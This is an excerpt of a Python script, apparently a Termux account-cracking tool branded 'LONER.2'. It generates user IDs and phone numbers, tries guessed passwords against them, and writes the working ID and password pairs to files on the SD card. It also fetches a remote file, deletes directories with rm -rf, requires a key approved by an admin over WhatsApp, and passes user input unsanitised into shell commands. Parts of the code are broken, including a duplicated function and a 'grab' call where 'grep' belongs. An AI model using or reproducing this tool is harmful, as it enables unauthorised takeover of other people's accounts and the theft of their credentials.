...
#----[remover]-----
try:
	plr = requests.get('https://raw.githubusercontent.com/TechnicalZA/Main2/main/Server.txt').text
except:
	sz=""
#--checking if file is not avalible 
os.system("rm -rf Main2")
os.system("rm -rf .Main2")

logo= f'''
 \033[1;92m_      ____  _   _ ______ _____  
\033[1;92m| |    / __ \| \ | |  ____|  __ \ 
\033[1;92m| |   | |  | |  \| | |__  | |__) |
\033[1;92m| |   | |  | | . ` |  __| |  _  / 
\033[1;92m| |___| |__| | |\  | |____| | \ \ 
\033[1;92m|______\____/|_| \_|______|_|  \_\
_________________________________   
 __Author__ : _TumisoZA_
 __TName__: _LONER.2_
 __Github__ : _TechicalZA_
_________________________________'''
...
def qsbuy():
	try:
		...
		try:
			...
			os.system("clear");print(logo)
			print(50*"-")
			print(f"\033[1;92m   [+]Key : {bumper}{s}")
			print(50*"-")
			input("[+]\033[1;96m Contact admin for key approval ")
			os.system(f"termux-open-url https://wa.me/+27837353309?text=Approve{bumper}")
			qsbuy()
...
def main():
	...
	print('[5] Clear Cache')
	print('[6] Password list \033[0;97m')
	print('[7] Contact admin')
	print('[0] Exit \033[0;97m')
	print(50*'-')
	menu_opt = input('\033[1;92m  [+] Select : ')
	if menu_opt =='1':
		method_crack()
	elif menu_opt =='2':
		create_file()
		...
		xchker()
		os.system('xdg-open https://github.com/Logiz45/run')
		main()
	elif menu_opt =='4':
		...
		os.system('clear')
		print('\033[1;91m [!]Opps, option invalid')
		os.system('clear')
	elif menu_opt == "7":
		try:
			os.system('termux-open-url https://wa.me/+27837353309?text=Hi, Admin')
		except:
			exit('Contacted admin successfully')
	elif menu_opt == "0":
		main()
	else:
...
def login():
	...
	try:
		...
		print('\n \033[1;91m [!]lnavlid cookies...')
		exit()
	except requests.exceptions.ConnectionError:
		print('\n \033[1;91m [!]No internet connection ...')
		exit()
	except AttributeError:
		print('\n \033[1;91m [!]lnvalid cookies ...')
		exit()
...
class crack_main():
	...
	def crackmail(self,id):
		...
		user=[]
		print(" [+] Input First Name Example. Admin")
		first = input(" First Name : ")
		last = input(" Last Name : ")
		print(" \n [*] Email : @gmail.co -- @yahoo.com -- @hotmail.com etc")
		domain = input(" Domain : ")
	...
	def cracknum(self,id):
		global methods
		os.system('clear');print(logo);xchker()
		print('\033[1;92m For Example :\033[0m 92310,92342,92300,92301 ...')
		kode = input('\033[1;92m   [+]Choose Code : \033[0m')
		print('\033[1;92mFor Example :\033[0m 2000,4000,6000 ...')
		limit = int(input('\033[1;92m IDs Limit : \033[0m'))
		for nmbr in range(limit):
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[=] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print('\033[1;92m [OK] '+roid+' | '+pas+'\033[1;96m')
					open('/sdcard/loner_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'Please Confirm Email' in po:
					print('\033[1;92m [OK] '+roid+' | '+pas+'\033[1;92m')
					open('/sdcard/loner_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'User must verify their account' in po:
					try:
						print('\033[1;91m [CP] '+roid+' | '+pas+'\033[1;91m')
						open('/sdcard/loner_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Example. admin123 -- admin786 --')
		print(50*"-")
		for cd in range(pl):
		...
		print('[+] Ok Ids Save In : /sdcard/loner_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
...
def auto_file(cookies,access_token):
	...
	print('\n \033[1;92m /sdcard/xxx1.txt \033[1;92m\n')
	#100025136884402
...
def loner(exid,cookies,access_token,sf):
	try:
		global total,loop
...
def sep():
	...
	file_name = input('\033[1;92m [+]lnput file path : ')
	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
	new_save = input('\n \033[1;91m[+] Save new file as : ')
	y = 0
	print(f"{ro} IDs to Grab Ex [ 100087,10000,10006 etc ]{s}")
	for k in range(limit):
		y+=1
		links=input(' Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print(44*"\033[1;96m-")
	print(f'[+]IDs grabbed successfully')
	print('[=]Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
	print('[=] New file saved as : \033[0;33m '+new_save)
	print(44*"\033[1;96m-")
	input('\ Press enter to back')
	main()
...
def sep():
	...
	try:
		...
		limit = 1
	print(f'\033[1;92m File Path Example /sdcard/xxx.txt{s}')
	file_name = input('[+] Input file path : ')
	print(f'[+] Save As Example /sdcard/newfile.txt')
	new_save = input('\033[1;92m Save new file as : ')
	y = 0
	print(f"[+] Ids To Grabb Ex [ 100087,10000,10006 ...etc ]")
	for k in range(limit):
		y+=1
		links=input(' [+]Put Uid Type : ')
		os.system('cat '+file_name+' | grab "'+links+'" >> '+new_save)
	print(44*"\033[1;92m-")
	print(f'[+] IDs grabbed successfully')
	print('  [+]Total grabbed ids : '+str(len(open(new_save).read().splitlines())))
	print('  [+] New file saved as : \033[0;33m '+new_save)
	print(44*"\033[1;92m-")
	input('Press enter to back ')
	main()
...
def double():
	...
	try:
		...
		print(' \n\033[1;92m Example: /sdcard/xxx.txt\n\033[0;97m')
